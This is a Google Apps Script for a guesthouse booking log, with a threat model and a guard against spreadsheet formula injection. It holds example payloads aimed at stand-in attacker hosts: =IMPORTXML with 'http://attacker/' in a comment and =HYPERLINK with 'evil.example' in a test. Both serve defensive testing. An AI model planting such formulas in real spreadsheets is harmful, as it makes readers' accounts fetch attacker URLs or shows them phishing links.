/**
 * ══════════════════════════════════════════════════════════════════
 * KITO OAK HAVEN — booking log
 * ══════════════════════════════════════════════════════════════════
 *
 * Receives one row per booking enquiry from the website and appends it
 * to this sheet. It is the ledger the KSh 1,000/night commission is
 * argued from, and the one thing the owner and Alex both read.
 *
 * ──────────────────────────────────────────────────────────────────
 * THREAT MODEL — why this is not the naive version
 * ──────────────────────────────────────────────────────────────────
 * A deployed web app must be readable by "Anyone", because guests are
 * not signed in to Google. So this URL is public and anything on the
 * internet can POST to it. Three real consequences:
 *
 * 1. FORMULA INJECTION — the serious one. A cell whose value starts
 *    with = + - or @ is evaluated as a formula. A hostile payload of
 *    =IMPORTXML("http://attacker/",...) makes YOUR sheet fetch a URL
 *    under the reader's account, and =HYPERLINK can phish whoever
 *    opens it. Every string is therefore neutralised before it is
 *    written, by prefixing a single quote, which Sheets treats as
 *    "this is text" and never renders.
 *
 * 2. JUNK ROWS — scanners crawl for open endpoints. A shared token
 *    keeps casual traffic out. Honest limit: that token ships inside
 *    the site's JavaScript, so anyone who views source can read it.
 *    It stops bots, not a determined person. For a booking log that
 *    is the right level; it is not a secret and must never guard
 *    anything that matters.
 *
 * 3. NOISE FROM BAD REQUESTS — malformed posts used to write an ERROR
 *    row each. Rejections are now silent, so the ledger only ever
 *    contains real enquiries.
 *
 * The blast radius stays small by design: this script only ever
 * APPENDS. It cannot read rows back, cannot return sheet contents,
 * and exposes nothing about the sheet to the caller.
 *
 * ──────────────────────────────────────────────────────────────────
 * SETUP
 * ──────────────────────────────────────────────────────────────────
 * Deploy → New deployment → gear → Web app
 *   Execute as:     Me
 *   Who has access: Anyone      ← not "Anyone with Google account"
 * Copy the /exec URL. It goes into site.bookingLogUrl.
 *
 * Share the SHEET with the owner as Viewer, by link. Never public —
 * it carries guest-side data.
 */

var SHEET_NAME = 'Bookings';

/** Must match site.bookingLogToken exactly. */
var SHARED_TOKEN = 'JSX1p9iZb8DF2tUZOitglYtNgciPGWC4';

/** Anything longer is not a real enquiry from our own form. */
var MAX_BODY = 2000;

// Check-in / Check-out are filled in BY HAND when a booking is confirmed.
// The site cannot know them — a guest picks dates in conversation, not on
// the page. With no Airbnb calendar in play, these two columns are the
// booking calendar: sort by Check-in and you can see every held night.
var HEADERS = [
  'Ref', 'Logged (EAT)', 'Source', 'Nights', 'Guest Airbnb quote',
  'Direct rate', 'Commission due', 'Came from',
  'Check-in', 'Check-out', 'Guest name',
  'Status', 'Notes'
];

/** Sources our own site actually sends. Anything else is not ours. */
var ALLOWED_SOURCES = ['hero', 'calculator', 'booking-section', 'sticky-bar', 'manual-test'];

function doPost(e) {
  // Reject quietly. A rejected request must never write a row, or the
  // ledger fills with other people's noise.
  if (!e || !e.postData || !e.postData.contents) return json_({ ok: false });
  if (e.postData.contents.length > MAX_BODY) return json_({ ok: false });

  var data;
  try {
    data = JSON.parse(e.postData.contents);
  } catch (err) {
    return json_({ ok: false });
  }

  if (!data || data.token !== SHARED_TOKEN) return json_({ ok: false });

  // The chat asks a question and waits for an answer; the booking log only
  // ever appends and returns nothing useful. Different shapes, so they route
  // apart here rather than one pretending to be the other.
  if (data.type === 'chat') {
    if (typeof handleChat_ !== 'function') return json_({ ok: false, reply: '' });
    return json_(handleChat_(data));
  }

  // Shape check. Our own form always produces KOH- plus four characters
  // from an unambiguous alphabet; anything else did not come from us.
  var ref = String(data.ref || '');
  if (!/^KOH-[A-Z2-9]{4}$/.test(ref)) return json_({ ok: false });

  var source = String(data.source || '');
  if (ALLOWED_SOURCES.indexOf(source) === -1) source = 'unknown';

  try {
    getSheet_().appendRow([
      safe_(ref),
      safe_(formatEAT_(data.at)),
      safe_(source),
      num_(data.nights, 0, 365),
      num_(data.quoteKsh, 0, 10000000),
      num_(data.nightlyKsh, 0, 10000000),
      num_(data.commissionKsh, 0, 10000000),
      safe_(String(data.referrer || '').slice(0, 200)),
      // Dates arrive from the calendar on the site when the guest picked them.
      // They used to be typed in by hand on confirmation, which is how a
      // confirmed booking could sit here holding nothing because its dates
      // were unreadable. Anything that is not a plain ISO date is dropped
      // rather than written, so the collision check never reads a guess.
      ymd_(data.checkIn),
      ymd_(data.checkOut),
      '', // Guest name — filled by hand on confirmation
      'enquiry',
      ''
    ]);
    return json_({ ok: true, ref: ref });
  } catch (err) {
    return json_({ ok: false });
  }
}

/** Open the /exec URL in a browser to confirm the deployment is alive. */
function doGet() {
  return json_({ ok: true, service: 'kito-booking-log' });
}

/**
 * Neutralise spreadsheet formula injection.
 *
 * Sheets evaluates any cell beginning = + - or @ as a formula. Prefixing
 * an apostrophe forces it to be treated as literal text; the apostrophe
 * itself is never displayed. Without this, a hostile payload can make the
 * sheet issue network requests or render a phishing link to whoever opens
 * it — including the owner.
 */
function safe_(value) {
  var s = String(value == null ? '' : value);
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}

/**
 * A plain ISO date or nothing. The calendar on the site sends yyyy-mm-dd; a
 * request that sends anything else did not come from it, and writing a
 * half-parsed date into the booking calendar is worse than writing none.
 */
function ymd_(value) {
  var s = String(value == null ? '' : value).trim();
  if (!/^\d{4}-\d{2}-\d{2}$/.test(s)) return '';
  var d = new Date(s + 'T12:00:00Z');
  if (isNaN(d.getTime())) return '';
  // Rejects 2026-02-31, which passes the pattern and then rolls into March.
  if (Utilities.formatDate(d, 'UTC', 'yyyy-MM-dd') !== s) return '';
  return s;
}

/** Numbers only, clamped. Stops text or absurd values entering the ledger. */
function num_(value, min, max) {
  var n = Number(value);
  if (!isFinite(n)) return '';
  if (n < min || n > max) return '';
  return n;
}

function getSheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(SHEET_NAME);
  if (!sheet) sheet = ss.insertSheet(SHEET_NAME);
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    sheet.getRange(1, 1, 1, HEADERS.length)
         .setFontWeight('bold')
         .setBackground('#f2efe9');
    sheet.setFrozenRows(1);
    sheet.setColumnWidth(1, 100);
    sheet.setColumnWidth(2, 150);
  }
  return sheet;
}

/** Nairobi is UTC+3 with no DST, so this is a fixed offset. */
function formatEAT_(iso) {
  var d = iso ? new Date(iso) : new Date();
  if (isNaN(d.getTime())) d = new Date();
  return Utilities.formatDate(d, 'Africa/Nairobi', 'yyyy-MM-dd HH:mm');
}

function json_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

/** Select this in the dropdown and press Run to confirm the sheet works. */
function testWrite() {
  doPost({ postData: { contents: JSON.stringify({
    token: SHARED_TOKEN,
    ref: 'KOH-TEST', source: 'manual-test', nights: 3,
    quoteKsh: 9500, nightlyKsh: 7000, commissionKsh: 3000,
    at: new Date().toISOString(), referrer: 'test'
  })}});
}

/**
 * Proves the injection guard works. Run it, then look at the sheet: the
 * formula must appear as literal text, NOT evaluate. If you see anything
 * other than the raw string, stop and tell someone.
 */
function testInjection() {
  doPost({ postData: { contents: JSON.stringify({
    token: SHARED_TOKEN,
    ref: 'KOH-XY9Z', source: 'manual-test', nights: 1,
    quoteKsh: 1, nightlyKsh: 1, commissionKsh: 1,
    at: new Date().toISOString(),
    referrer: '=HYPERLINK("http://evil.example","click me")'
  })}});
}
